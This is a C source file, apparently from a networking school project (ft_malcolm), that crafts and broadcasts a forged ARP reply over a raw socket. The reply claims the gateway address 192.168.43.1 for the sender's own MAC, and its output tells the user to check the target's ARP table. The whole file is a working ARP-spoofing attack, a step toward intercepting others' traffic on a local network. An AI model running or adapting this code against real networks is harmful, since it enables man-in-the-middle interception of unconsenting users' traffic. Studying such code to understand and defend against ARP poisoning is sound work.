#include "ft_malcolm.h"

/*
Ethernet Header
  |- Destination MAC Address
  |- Source MAC Address
  |- EtherType (ARP: 0x0806)

ARP Header
  |- Hardware Type (Ethernet: 1)
  |- Protocol Type (IPv4: 0x0800)
  |- Hardware Address Length (MAC address length: 6)
  |- Protocol Address Length (IPv4 address length: 4)
  |- Operation (ARP Reply: 2)
  |- Sender MAC Address
  |- Sender IP Address
  |- Target MAC Address
  |- Target IP Address

Payload (if any)
*/

_mc_t_packet _mc_create_packet_for_spoofing(void)
{
    // Create and initialize an ARP reply packet
    _mc_t_packet packet;
    // Initialize the ARP header and Ethernet header to zero
    memset(&packet.ethernet_header, 0, sizeof(struct ethhdr));
    memset(&packet.arp_packet, 0, sizeof(_t_mc_arp_header));

    // Ethernet header
    memset(packet.ethernet_header.h_dest, 0x00, ETH_ALEN); // Placeholder for destination MAC
    memset(packet.ethernet_header.h_source, 0x00, ETH_ALEN);  // Placeholder for source MAC
    packet.ethernet_header.h_proto = htons(ETH_P_ARP);   // EtherType for ARP

    // ARP header
    packet.arp_packet.ar_hrd = htons(ARPHRD_ETHER);      // Ethernet (1)
    packet.arp_packet.ar_pro = htons(0x0800); // IPv4
    packet.arp_packet.ar_hln = ETH_ALEN;             // MAC address size
    packet.arp_packet.ar_pln = _MC_IPV4_BYTE_SIZE;             // IPv4 address size
    packet.arp_packet.ar_op = htons(ARPOP_REPLY);   // ARP Reply (2)

    // Spoofing the ARP packet
    uint8_t spoofip[4];
    uint8_t sendermac[6];
    uint8_t broadcastip[4];
    uint8_t broadcastmac[6];
    _mc_convert_string_to_byte_ip("192.168.43.1", spoofip);
    _mc_convert_string_to_byte_ip("192.168.43.255", broadcastip);
    _mc_convert_mac_string_to_bytes("00:00:00:00:00:00", sendermac);
    _mc_convert_mac_string_to_bytes("ff:ff:ff:ff:ff:ff", broadcastmac);
    // _mc_convert_mac_string_to_bytes("9c:b6:d0:6a:c1:b9", sendermac);

    memcpy(packet.ethernet_header.h_dest, broadcastmac, ETH_ALEN);          // Set destination MAC
    memcpy(packet.ethernet_header.h_source, _mc_g_data.host_mac, ETH_ALEN); // Set source MAC

    // Modify the ARP packet
    memcpy(packet.arp_packet.__ar_sha, _mc_g_data.host_mac, ETH_ALEN);
    memcpy(packet.arp_packet.__ar_sip, spoofip, _MC_IPV4_BYTE_SIZE);
    memcpy(&packet.arp_packet.__ar_tha, sendermac, ETH_ALEN);
    memcpy(&packet.arp_packet.__ar_tip, broadcastip, _MC_IPV4_BYTE_SIZE);

    return packet;
}

void _mc_run_arp_spoofing(void)
{
    _mc_t_packet packet = _mc_create_packet_for_spoofing();

    // Initialize the source address structure
    memset(&_mc_g_data.src_addr, 0, sizeof(_mc_g_data.src_addr));
    _mc_g_data.src_addr.sll_family = AF_PACKET;
    _mc_g_data.src_addr.sll_ifindex = if_nametoindex("wlo1"); // Use your network interface
    // _mc_g_data.src_addr.sll_ifindex = if_nametoindex("wlx00c0ca97cc19"); // Use your network interface
    if (_mc_g_data.src_addr.sll_ifindex == 0)
    {
        perror("if_nametoindex failed");
        exit(EXIT_FAILURE);
    }

    _mc_g_data.src_addr.sll_halen = ETH_ALEN;
    memcpy(_mc_g_data.src_addr.sll_addr, packet.ethernet_header.h_dest, ETH_ALEN);

    printf(_MC_YELLOW_COLOR
           ">> Now sending an ARP reply to the target address with spoofed source <<" _MC_RESET_COLOR "\n\n");

    printf("Ethernet header:\n");
    printf("h_dest: ");
    _mc_print_mac(packet.ethernet_header.h_dest);
    printf("h_src: ");
    _mc_print_mac(packet.ethernet_header.h_source);

    printf("ARP opcode: 0x%04x\n\n", ntohs(packet.arp_packet.ar_op));
    printf("ARP hardware type: 0x%04x\n\n", ntohs(packet.arp_packet.ar_hrd));
    printf("ARP protocol type: 0x%04x\n\n", ntohs(packet.arp_packet.ar_pro));
    printf("ARP hardware size: 0x%04x\n\n", ntohs(packet.arp_packet.ar_hln));

    int ret = sendto(
        _mc_g_data.raw_sockfd, &packet, sizeof(_mc_t_packet), 0,
        (struct sockaddr *)&_mc_g_data.src_addr, sizeof(struct sockaddr_ll));

    if (ret <= 0)
        perror("[x] Failed to send the ARP reply");
    else
        printf("\nSent an ARP reply packet, you may now check the ARP table on the target\n");
}
